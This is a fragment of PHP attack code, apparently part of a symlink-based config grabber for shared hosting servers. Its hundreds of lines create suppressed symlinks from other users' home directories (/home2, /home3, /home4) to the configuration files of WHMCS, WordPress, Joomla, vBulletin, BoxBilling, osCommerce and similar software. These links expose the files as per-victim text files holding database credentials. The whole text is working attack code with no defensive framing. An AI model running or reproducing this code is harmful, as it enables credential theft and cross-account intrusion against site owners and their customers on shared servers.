@symlink('/home2/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home3

@symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home3/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home4

@symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home4/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home4/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
